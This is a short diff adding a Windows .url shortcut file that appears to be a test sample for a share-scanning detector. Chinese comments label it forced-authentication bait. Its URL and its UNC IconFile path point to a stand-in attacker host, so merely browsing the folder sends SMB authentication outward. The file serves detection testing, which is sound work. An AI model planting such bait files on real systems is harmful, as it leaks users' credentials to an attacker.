@@ -1,0 +1,12 @@
+[InternetShortcut]
+URL=https://portal.attacker.example.org/landing
+IconIndex=0
+IconFile=\\attacker.example.org\icons\web.ico
+
+; ============================================================
+; 强制认证诱饵样本 —— .url (Internet Shortcut)
+; 攻击面有两条:
+;   1) URL= 指向攻击者 HTTP 服务器,服务器返回 401 Negotiate 即可触发认证
+;   2) IconFile= 的 UNC 路径在浏览目录渲染图标时即触发 SMB 外发(无需点击)
+; ShareGuard 会同时提取两个引用,任一指向非信任主机即判 Malicious
+; ============================================================
